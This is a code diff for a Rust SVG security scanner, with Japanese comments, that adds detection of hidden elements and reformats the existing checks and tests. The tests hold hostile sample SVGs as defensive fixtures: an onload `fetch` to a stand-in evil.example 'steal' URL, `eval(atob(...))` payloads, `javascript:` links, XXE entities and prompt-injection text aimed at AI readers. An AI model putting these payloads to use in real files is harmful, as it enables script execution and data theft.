@@ -88,6 +88,16 @@ pub enum SvgRisk {
     /// XXE 形式のペイロードによるローカルファイル読み出しや、
     /// 入れ子実体による billion laughs 型 DoS の入口になる。
     XmlExternalEntity,
+    /// 非表示要素 (`display="none"` / `visibility:hidden` / `opacity:0` /
+    /// `font-size:0` 等) を含む。
+    ///
+    /// Microsoft 脅威情報が報告した AI 生成難読化 SVG (2025-09) のように、
+    /// 実体を見せずスキャナだけに構造を見せる (あるいはその逆) 難読化で
+    /// 使われる。単体では実行リスクではないが回避の兆候として記録する。
+    HiddenContent {
+        /// 検出された非表示化の手法。
+        method: String,
+    },
 }
 
 /// SVG 解析結果。
@@ -109,7 +119,10 @@ pub fn looks_like_svg(content: &str) -> bool {
     const SCAN_BYTES: usize = 8 * 1024;
     let end = if content.len() > SCAN_BYTES {
         // UTF-8 境界で安全に切る
-        (0..=SCAN_BYTES).rev().find(|&i| content.is_char_boundary(i)).unwrap_or(0)
+        (0..=SCAN_BYTES)
+            .rev()
+            .find(|&i| content.is_char_boundary(i))
+            .unwrap_or(0)
     } else {
         content.len()
     };
@@ -145,15 +158,25 @@ pub fn scan_svg(content: &str) -> SvgScan {
     // 2. イベントハンドラ属性
     //    <script> を使わずに実行できるため、SVG では特に重要。
     const EVENT_HANDLERS: &[&str] = &[
-        "onload", "onerror", "onclick", "onmouseover", "onfocus",
-        "onanimationstart", "onbegin", "onend", "onrepeat", "onactivate",
+        "onload",
+        "onerror",
+        "onclick",
+        "onmouseover",
+        "onfocus",
+        "onanimationstart",
+        "onbegin",
+        "onend",
+        "onrepeat",
+        "onactivate",
     ];
     for handler in EVENT_HANDLERS {
         // `onload=` / `onload =` の両方に対応
         if let Some(pos) = lower.find(handler) {
             let rest = lower[pos + handler.len()..].trim_start();
             if rest.starts_with('=') {
-                risks.push(SvgRisk::EventHandler { handler: (*handler).to_string() });
+                risks.push(SvgRisk::EventHandler {
+                    handler: (*handler).to_string(),
+                });
             }
         }
     }
@@ -161,7 +184,9 @@ pub fn scan_svg(content: &str) -> SvgScan {
     // 3. 実行可能スキーム
     for scheme in ["javascript:", "vbscript:", "data:text/html"] {
         if lower.contains(scheme) {
-            risks.push(SvgRisk::DangerousScheme { scheme: scheme.to_string() });
+            risks.push(SvgRisk::DangerousScheme {
+                scheme: scheme.to_string(),
+            });
         }
     }
 
@@ -171,7 +196,12 @@ pub fn scan_svg(content: &str) -> SvgScan {
     }
 
     // 5. 外部リソース参照 (トラッキング/追加ペイロード)
-    for marker in ["xlink:href=\"http", "href=\"http", "xlink:href='http", "href='http"] {
+    for marker in [
+        "xlink:href=\"http",
+        "href=\"http",
+        "xlink:href='http",
+        "href='http",
+    ] {
         if let Some(pos) = lower.find(marker) {
             let snippet: String = lower[pos..].chars().take(80).collect();
             risks.push(SvgRisk::ExternalReference { target: snippet });
@@ -187,6 +217,37 @@ pub fn scan_svg(content: &str) -> SvgScan {
     // 7. XML 外部実体宣言 (XXE 形式ペイロード / billion laughs 型 DoS)
     if lower.contains("<!doctype") || lower.contains("<!entity") {
         risks.push(SvgRisk::XmlExternalEntity);
+    }
+
+    // 7.5 非表示要素 (D1256 — AI 生成難読化 SVG の典型手口)
+    //     `display="none"`/`visibility:hidden`/`opacity:0`/`font-size:0` で
+    //     人間には見えない構造 (本物のペイロードや囮図形) を持つ。
+    //     Microsoft 脅威情報 (2025-09) の解析で invisible elements が名指し
+    //     された難読化手段。実行リスクではないが回避の兆候として記録する。
+    for method in [
+        "display=\"none\"",
+        "display='none'",
+        "display: none",
+        "display:none",
+        "visibility=\"hidden\"",
+        "visibility='hidden'",
+        "visibility: hidden",
+        "visibility:hidden",
+        "opacity=\"0\"",
+        "opacity='0'",
+        "opacity:0",
+        "opacity: 0",
+        "font-size=\"0\"",
+        "font-size='0'",
+        "font-size:0",
+        "font-size: 0",
+    ] {
+        if lower.contains(method) {
+            risks.push(SvgRisk::HiddenContent {
+                method: method.to_string(),
+            });
+            break;
+        }
     }
 
     // 8. AI へのプロンプト注入検査 (マルチモーダル注入)
@@ -234,7 +295,10 @@ pub fn scan_svg(content: &str) -> SvgScan {
         )
     });
 
-    SvgScan { risks, safe_as_attachment: !has_execution_risk }
+    SvgScan {
+        risks,
+        safe_as_attachment: !has_execution_risk,
+    }
 }
 
 /// SVG から「AI が読み得るテキスト」を抽出する。
@@ -248,23 +312,30 @@ pub fn scan_svg(content: &str) -> SvgScan {
 fn extract_ai_visible_text(content: &str) -> Vec<String> {
     let mut out = Vec::new();
 
+    // タグ検索用に一度だけ小文字化する (タグ名の大小を無視するため)。
+    // `to_ascii_lowercase` は非 ASCII バイトを変更せずバイト長も保存するため、
+    // `lower` 上のバイト位置をそのまま `content` のスライスに使える。
+    let lower = content.to_ascii_lowercase();
+
     // 要素の内容を抽出 (開始タグの `>` から対応する終了タグまで)。
     for tag in ["title", "desc", "text", "tspan"] {
         let open = format!("<{tag}");
         let close = format!("</{tag}");
-        let lower = content.to_ascii_lowercase();
         let mut search_from = 0usize;
         while let Some(rel) = lower[search_from..].find(&open) {
             let tag_start = search_from + rel;
             // 開始タグの終端 `>` を探す
-            let Some(gt_rel) = lower[tag_start..].find('>') else { break };
+            let Some(gt_rel) = lower[tag_start..].find('>') else {
+                break;
+            };
             let body_start = tag_start + gt_rel + 1;
             let Some(close_rel) = lower[body_start..].find(&close) else {
                 search_from = body_start;
                 continue;
             };
             let body_end = body_start + close_rel;
-            if body_start <= body_end && content.is_char_boundary(body_start)
+            if body_start <= body_end
+                && content.is_char_boundary(body_start)
                 && content.is_char_boundary(body_end)
             {
                 out.push(content[body_start..body_end].to_string());
@@ -302,7 +373,9 @@ fn extract_ai_visible_text(content: &str) -> Vec<String> {
 fn extract_script_type(script_tag_onward: &str) -> Option<String> {
     let type_pos = script_tag_onward.find("type")?;
     // タグの終端を越えていたら type 属性ではない
-    let tag_end = script_tag_onward.find('>').unwrap_or(script_tag_onward.len());
+    let tag_end = script_tag_onward
+        .find('>')
+        .unwrap_or(script_tag_onward.len());
     if type_pos > tag_end {
         return None;
     }
@@ -314,7 +387,9 @@ fn extract_script_type(script_tag_onward: &str) -> Option<String> {
     };
     let end = match quote {
         Some(q) => body.find(q)?,
-        None => body.find(|c: char| c.is_whitespace() || c == '>').unwrap_or(body.len()),
+        None => body
+            .find(|c: char| c.is_whitespace() || c == '>')
+            .unwrap_or(body.len()),
     };
     Some(body[..end].to_string())
 }
@@ -332,7 +407,11 @@ mod tests {
     fn plain_svg_is_safe() {
         let svg = r#"<svg xmlns="http://www.w3.org/2000/svg"><circle cx="5" cy="5" r="4"/></svg>"#;
         let scan = scan_svg(svg);
-        assert!(scan.safe_as_attachment, "無害な SVG が危険判定された: {:?}", scan.risks);
+        assert!(
+            scan.safe_as_attachment,
+            "無害な SVG が危険判定された: {:?}",
+            scan.risks
+        );
     }
 
     #[test]
@@ -340,7 +419,10 @@ mod tests {
         let svg = r#"<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>"#;
         let scan = scan_svg(svg);
         assert!(!scan.safe_as_attachment);
-        assert!(scan.risks.iter().any(|r| matches!(r, SvgRisk::ScriptElement { .. })));
+        assert!(scan
+            .risks
+            .iter()
+            .any(|r| matches!(r, SvgRisk::ScriptElement { .. })));
     }
 
     #[test]
@@ -348,7 +430,10 @@ mod tests {
         // 2026 年の回避手法: text/javascript ではなく application/ecmascript を使う
         let svg = r#"<svg><script type="application/ecmascript">fetch('//evil')</script></svg>"#;
         let scan = scan_svg(svg);
-        assert!(!scan.safe_as_attachment, "非推奨 MIME 型のスクリプトがすり抜けた");
+        assert!(
+            !scan.safe_as_attachment,
+            "非推奨 MIME 型のスクリプトがすり抜けた"
+        );
         let found_type = scan.risks.iter().find_map(|r| match r {
             SvgRisk::ScriptElement { script_type } => script_type.clone(),
             _ => None,
@@ -366,7 +451,10 @@ mod tests {
         let svg = r#"<svg onload="fetch('https://evil.example/steal')"><rect/></svg>"#;
         let scan = scan_svg(svg);
         assert!(!scan.safe_as_attachment, "onload ハンドラがすり抜けた");
-        assert!(scan.risks.iter().any(|r| matches!(r, SvgRisk::EventHandler { .. })));
+        assert!(scan
+            .risks
+            .iter()
+            .any(|r| matches!(r, SvgRisk::EventHandler { .. })));
     }
 
     #[test]
@@ -374,15 +462,24 @@ mod tests {
         let svg = r#"<svg><a xlink:href="javascript:alert(1)"><text>click</text></a></svg>"#;
         let scan = scan_svg(svg);
         assert!(!scan.safe_as_attachment);
-        assert!(scan.risks.iter().any(|r| matches!(r, SvgRisk::DangerousScheme { .. })));
+        assert!(scan
+            .risks
+            .iter()
+            .any(|r| matches!(r, SvgRisk::DangerousScheme { .. })));
     }
 
     #[test]
     fn foreign_object_detected() {
         let svg = r#"<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml">x</body></foreignObject></svg>"#;
         let scan = scan_svg(svg);
-        assert!(!scan.safe_as_attachment, "foreignObject による HTML 埋め込みがすり抜けた");
-        assert!(scan.risks.iter().any(|r| matches!(r, SvgRisk::ForeignObject)));
+        assert!(
+            !scan.safe_as_attachment,
+            "foreignObject による HTML 埋め込みがすり抜けた"
+        );
+        assert!(scan
+            .risks
+            .iter()
+            .any(|r| matches!(r, SvgRisk::ForeignObject)));
     }
 
     #[test]
@@ -390,7 +487,10 @@ mod tests {
         // 多層エンコード (EML → SVG → base64 iframe) の内側
         let svg = r#"<svg><script>eval(atob('ZmV0Y2goJy8vZXZpbCcp'))</script></svg>"#;
         let scan = scan_svg(svg);
-        assert!(scan.risks.iter().any(|r| matches!(r, SvgRisk::EmbeddedEncodedPayload)));
+        assert!(scan
+            .risks
+            .iter()
+            .any(|r| matches!(r, SvgRisk::EmbeddedEncodedPayload)));
     }
 
     #[test]
@@ -398,8 +498,14 @@ mod tests {
         // 外部参照のみなら実行リスクではない (トラッキング懸念として記録)
         let svg = r#"<svg><image href="https://tracker.example/p.png"/></svg>"#;
         let scan = scan_svg(svg);
-        assert!(scan.risks.iter().any(|r| matches!(r, SvgRisk::ExternalReference { .. })));
-        assert!(scan.safe_as_attachment, "外部参照だけでは実行リスクとしない");
+        assert!(scan
+            .risks
+            .iter()
+            .any(|r| matches!(r, SvgRisk::ExternalReference { .. })));
+        assert!(
+            scan.safe_as_attachment,
+            "外部参照だけでは実行リスクとしない"
+        );
     }
 
     // ── マルチモーダル・プロンプト注入 (arxiv 2603.03637) ────────────────
@@ -412,10 +518,16 @@ mod tests {
 <circle cx="5" cy="5" r="4"/></svg>"#;
         let scan = scan_svg(svg);
         assert!(
-            scan.risks.iter().any(|r| matches!(r, SvgRisk::PromptInjectionAttempt { .. })),
-            "<desc> のプロンプト注入が検出されなかった: {:?}", scan.risks
+            scan.risks
+                .iter()
+                .any(|r| matches!(r, SvgRisk::PromptInjectionAttempt { .. })),
+            "<desc> のプロンプト注入が検出されなかった: {:?}",
+            scan.risks
         );
-        assert!(!scan.safe_as_attachment, "注入を含む SVG は添付として安全ではない");
+        assert!(
+            !scan.safe_as_attachment,
+            "注入を含む SVG は添付として安全ではない"
+        );
     }
 
     #[test]
@@ -426,8 +538,11 @@ mod tests {
 <rect width="10" height="10"/></svg>"#;
         let scan = scan_svg(svg);
         assert!(
-            scan.risks.iter().any(|r| matches!(r, SvgRisk::PromptInjectionAttempt { .. })),
-            "XML コメントに隠された注入が検出されなかった: {:?}", scan.risks
+            scan.risks
+                .iter()
+                .any(|r| matches!(r, SvgRisk::PromptInjectionAttempt { .. })),
+            "XML コメントに隠された注入が検出されなかった: {:?}",
+            scan.risks
         );
     }
 
@@ -439,8 +554,11 @@ mod tests {
 </svg>"#;
         let scan = scan_svg(svg);
         assert!(
-            scan.risks.iter().any(|r| matches!(r, SvgRisk::PromptInjectionAttempt { .. })),
-            "CDATA 内の注入が検出されなかった: {:?}", scan.risks
+            scan.risks
+                .iter()
+                .any(|r| matches!(r, SvgRisk::PromptInjectionAttempt { .. })),
+            "CDATA 内の注入が検出されなかった: {:?}",
+            scan.risks
         );
     }
 
@@ -452,8 +570,11 @@ mod tests {
 <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>"#;
         let scan = scan_svg(svg);
         assert!(
-            scan.risks.iter().any(|r| matches!(r, SvgRisk::XmlExternalEntity)),
-            "XML 外部実体宣言が検出されなかった: {:?}", scan.risks
+            scan.risks
+                .iter()
+                .any(|r| matches!(r, SvgRisk::XmlExternalEntity)),
+            "XML 外部実体宣言が検出されなかった: {:?}",
+            scan.risks
         );
         assert!(!scan.safe_as_attachment);
     }
@@ -467,10 +588,18 @@ mod tests {
 <text x="10" y="20">合計 120,000 円</text></svg>"#;
         let scan = scan_svg(svg);
         assert!(
-            !scan.risks.iter().any(|r| matches!(r, SvgRisk::PromptInjectionAttempt { .. })),
-            "通常の日本語テキストを注入と誤検出した: {:?}", scan.risks
+            !scan
+                .risks
+                .iter()
+                .any(|r| matches!(r, SvgRisk::PromptInjectionAttempt { .. })),
+            "通常の日本語テキストを注入と誤検出した: {:?}",
+            scan.risks
         );
-        assert!(scan.safe_as_attachment, "無害な SVG が危険判定された: {:?}", scan.risks);
+        assert!(
+            scan.safe_as_attachment,
+            "無害な SVG が危険判定された: {:?}",
+            scan.risks
+        );
     }
 
     #[test]
@@ -503,6 +632,53 @@ mod tests {
     fn looks_like_svg_rejects_non_svg() {
         assert!(!looks_like_svg("<html><body>hello</body></html>"));
         assert!(!looks_like_svg(""));
+    }
+
+    // ── D1256: 非表示要素による難読化 ──────────────────────────────────
+
+    #[test]
+    fn display_none_detected_as_hidden_content() {
+        // Microsoft AI 難読化 SVG で使われた invisible elements
+        let svg = r#"<svg><g display="none"><rect/></g><circle r="3"/></svg>"#;
+        let scan = scan_svg(svg);
+        assert!(
+            scan.risks
+                .iter()
+                .any(|r| matches!(r, SvgRisk::HiddenContent { .. })),
+            "display=\"none\" が検出されなかった: {:?}",
+            scan.risks
+        );
+        // 非表示要素単独は実行リスクではない (回避の兆候として記録)
+        assert!(scan.safe_as_attachment);
+    }
+
+    #[test]
+    fn opacity_and_font_size_zero_detected() {
+        for svg in [
+            r#"<svg><text style="opacity:0">x</text></svg>"#,
+            r#"<svg><text font-size="0">x</text></svg>"#,
+            r#"<svg><g style="visibility:hidden">x</g></svg>"#,
+        ] {
+            let scan = scan_svg(svg);
+            assert!(
+                scan.risks
+                    .iter()
+                    .any(|r| matches!(r, SvgRisk::HiddenContent { .. })),
+                "非表示要素が検出されなかった: {svg}"
+            );
+        }
+    }
+
+    #[test]
+    fn visible_svg_not_flagged_hidden() {
+        let svg = r#"<svg><circle cx="5" cy="5" r="4" fill="red"/></svg>"#;
+        let scan = scan_svg(svg);
+        assert!(
+            !scan.risks
+                .iter()
+                .any(|r| matches!(r, SvgRisk::HiddenContent { .. })),
+            "通常の SVG を非表示要素と誤検出した"
+        );
     }
 
     #[test]
